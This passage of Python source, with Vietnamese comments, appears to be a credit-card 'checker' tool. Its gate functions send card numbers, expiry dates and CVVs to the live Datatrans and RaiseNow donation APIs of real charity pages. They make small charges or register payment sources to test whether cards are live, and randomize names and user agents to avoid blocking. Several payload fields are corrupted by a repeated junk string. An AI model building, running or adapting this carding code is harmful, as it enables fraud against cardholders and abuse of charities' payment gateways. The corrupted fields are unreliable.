        payment_headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"Lỗi không xác định trong Gate 4 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống Gate 4: {e}", bin_info

def _check_card_gate5(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 5"""
    try:
        charge_value = _get_charge_value('5', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802162822879268", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=mrw5i3faj", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "ed99e982-2f16-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": charge_value}, "supporter": { "locale": "de", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat4417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,12500,25000]", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" }, "solution": {"uuid": "09f67512-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "tamaro", "source_url": "https://donate.raisenow.io/dbhrx?lng=de", "uuid": "self-service", "version": "2.16.0" }, "integration": {"donation_receipt_requested": "false"} }, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": { "brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "5acd9b09-387a-4a89-a090-13b16c4a0032", "return_url": "https://donate.raisenow.io/dbhrx?lng=de&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text:
            return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text:
            return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text:
            return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text:
            return 'custom', line, response_text, bin_info
        else:
            return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"Lỗi không xác định trong Gate 5 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống Gate 5: {e}", bin_info

def _check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 6"""
    try:
        charge_value = _get_charge_value('6', custom_charge_amount)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802205541759546", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "aa5124b6-2912-4ba1-b8ce-f43915685214", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value}, "supporter": { "locale": "en", "first_name": "Minh", "last_name": "Nhat", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" }, "solution": {"uuid": "d2c90617-8e65-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV", "source_url": "https://donate.raisenow.io/fxdnk?lng=en", "uuid": "self-service", "version": "2.16.0" }, "integration": {"donation_receipt_requested": "false"} }, "custom_parameters": {"campaign_id": "mindsup", "campaign_subid": ""}, "payment_information": { "brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "eccfaccc-7730-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_status":"succeeded"' in response_text:
            return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text:
            return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text:
            return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text:
            return 'custom', line, response_text, bin_info
        else:
            return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"Lỗi không xác định trong Gate 6 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống Gate 6: {e}", bin_info

def _check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 7 - Check Live"""
    try:
        random_first_name = generate_random_name(random.randint(4, 8))
        random_last_name = generate_random_name(random.randint(4, 8))
        random_cardholder = f"{random_first_name} {random_last_name}"
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250802162822879268", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=mrw5i3faj", "X-Requested-With": "XMLHttpRequest", "User-Agent": ua, "Accept": "*/*", "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5", "Cache-Control": "no-cache", "Connection": "keep-alive", "Pragma": "no-cache", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        payment_url = "https://api.raisenow.io/payment-sources"
        payment_payload = { "account_uuid": "ed99e982-2f16-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": 50}, "supporter": { "locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email": "minhnhat4417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,12500,25000]", "user_agent": ua}, "solution": {"uuid": "09f67512-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV": "tamaro", "source_url": "https://donate.raisenow.io/dbhrx?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": { "campaign_id": "", "campaign_subid": ""}, "payment_information": { "brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "5acd9b09-387a-4a89-a090-13b16c4a0032", "return_url": "https://donate.raisenow.io/dbhrx?lng=de&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36", "Pragma": "no-cache", "Accept": "*/*" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment Source: {error}", bin_info
        if not payment_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Payment Source", bin_info
        response_text = payment_response.text
        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
        if '"payment_source_status":"pending"' in response_text:
            return 'live_success', line, response_text, bin_info
        else:
            return 'decline', line, response_text, bin_info
    except Exception as e:
        logger.error(f"Lỗi không xác định trong Gate 7 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống Gate 7: {e}", bin_info

def _check_card_gate8(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 8 - Chế độ Charge hoặc Check Live"""
    gate8_mode = get_gate8_mode()
    try:
        random_first_name = generate_random_name(random.randint(4, 8))
        random_last_name = generate_random_name(random.randint(4, 8))
        random_cardholder = f"{random_first_name} {random_last_name}"
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250804202812044270", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "X-Requested-With": "XMLHttpRequest", "User-Agent": ua }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
        if gate8_mode == 'charge':
            charge_value = _get_charge_value('8', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = { "account_uuid": "ca1e7e48-d2ed-4d3c-aa7e-df7e93582adf", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": charge_value}, "supporter": { "locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "paylink", "suggested_amounts": [], "user_agent": ua }, "solution": { "uuid": "e0c23079-8884-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVsource_url": "https://donate.raisenow.io/mpnfg?lng=de", "uuid": "self-service", "version": "2.16.0" }, "integration": {"message": "efwwef"} }, "custom_parameters": { "campaign_id": "trauerspende", "campaign_subid": "" }, "payment_information": { "brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "15e9c847-fead-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV" }
            payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": ua }
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        else: # gate8_mode == 'live'
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = { "account_uuid": "ca1e7e48-d2ed-4d3c-aa7e-df7e93582adf", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": 50}, "supporter": { "locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} }, "raisenow_parameters": { "analytics": { "channel": "paylink", "suggested_amounts": [], "user_agent": ua }, "solution": { "uuid": "e0c23079-8884-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVsource_url": "https://donate.raisenow.io/mpnfg?lng=de", "uuid": "self-service", "version": "2.16.0" }, "integration": {"message": "efwwef"} }, "custom_parameters": { "campaign_id": "trauerspende", "campaign_subid": "" }, "payment_information": { "brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id }, "profile": "15e9c847-fead-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV" }
            payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": ua }
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment Source: {error}", bin_info
            if not payment_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Payment Source", bin_info
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            else: return 'decline', line, response_text, bin_info
    except Exception as e:
        logger.error(f"Lỗi không xác định trong Gate 8 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống Gate 8: {e}", bin_info

def _check_card_gate9(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 9 - Chế độ Charge hoặc Check Live"""
    def random_user_agent():
        chrome_major = random.randint(100, 140)
        chrome_build = random.randint(0, 5999)
        chrome_patch = random.randint(0, 200)
        webkit_major = random.randint(537, 538)
        webkit_minor = random.randint(36, 99)
        safari_version = f"{webkit_major}.{webkit_minor}"
        chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
        win_version = f"10.0; Win64; x64"
        return (f"Mozilla/5.0 (Windows NT {win_version}) AppleWebKit/{safari_version} (KHTML, like Gecko) Chrome/{chrome_version} Safari/{safari_version}")
    
    def random_string(length=8):
        return ''.join(random.choices(string.ascii_letters, k=length))

    gate9_mode = get_gate9_mode()
    try:
        user_agent = random_user_agent()
        browser_language = random.choice(["vi-VN", "en-US", "fr-FR", "de-DE"])
        # <<< THAY ĐỔI: Tên ngẫu nhiên dài hơn >>>
        first_name = random_string(10)
        last_name = random_string(12)
        cardholder_name = f"{first_name} {last_name}"
        
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250805043713003023", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": browser_language, "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7", "Cache-Control": "no-cache", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Pragma": "no-cache", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
        
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Tokenize", bin_info
        
        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info

        payment_headers = { "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7", "Cache-Control": "no-cache", "Content-Type": "application/json", "Host": "api.raisenow.io", "Origin": "https://donate.raisenow.io", "Pragma": "no-cache", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
        base_payload = { "account_uuid": "8376b96a-a35c-4c30-a9ed-cf298f57cdc5", "test_mode": False, "create_supporter": False, "supporter": { "locale": "en", "first_name": first_name, "last_name": last_name, "raisenow_parameters": {"analytics": { "channel": "paylink", "preselected_amount": 2000, "suggested_amounts": [2000, 5000, 10000], "user_agent": user_agent}} }, "solution": {"uuid": "7edeeaf-3394-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVsource_url": "https://donate.raisenow.io/jgcnt?lng=en", "uuid": "self-service", "version": "2.16.0", "integration": {"donation_receipt_requested": "false"} }, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": cardholder_name, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "de7a9ccb-9e5b-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV" }
        
        if gate9_mode == 'charge':
            charge_value = _get_charge_value('9', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "CHF", "value": charge_value}
            
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment: {error}", bin_info
            if not payment_response: return 'retry_needed', line, "Lỗi HTTP không có phản hồi khi Payment", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info
        
        else: # gate9_mode == 'live'
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload.copy()
            payment_payload["amount"] = {"currency": "CHF", "value": 50}
            
            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment Source: {error}", bin_info
            # <<< THAY ĐỔI: Trả về status 'retry_needed' để hàm check_card xử lý >>>
            if not payment_response: return 'retry_needed', line, "Lỗi HTTP không có phản hồi khi Payment Source", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            # <<< THAY ĐỔI: Xử lý các trường hợp decline và unknown >>>
            if '"payment_source_status":"pending"' in response_text: 
                return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text:
                return 'decline', line, response_text, bin_info
            else: 
                return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Lỗi không xác định trong Gate 9 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"Lỗi hệ thống Gate 9: {e}", bin_info

def check_card(line, cancellation_event=None, custom_charge_amount=None):
    if cancellation_event and cancellation_event.is_set():
        return 'cancelled', line, 'User cancelled', {}
    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""
    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part.strip(), date_split[0].strip(), date_split[1].strip(), cvv_part.strip()
            else:
                return 'invalid_format', line, "Định dạng ngày tháng không hợp lệ (mm/yy hoặc mm/yyyy).", {}
        else:
            return 'invalid_format', line, "Thiếu dấu '/' trong phần ngày tháng.", {}
    else:
        return 'invalid_format', line, "Định dạng không hợp lệ (cc|mm|yy|cvv hoặc cc|mm/yy|cvv).", {}
    
    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}
    
    try:
        year_str = ano.strip()
        if len(year_str) == 2:
            full_year = int(f"20{year_str}")
        elif len(year_str) == 4:
            full_year = int(year_str)
        else:
            full_year = 0
        if full_year < datetime.now().year:
            return 'decline', line, 'EXPIRED_CARD_DECLINE', {}
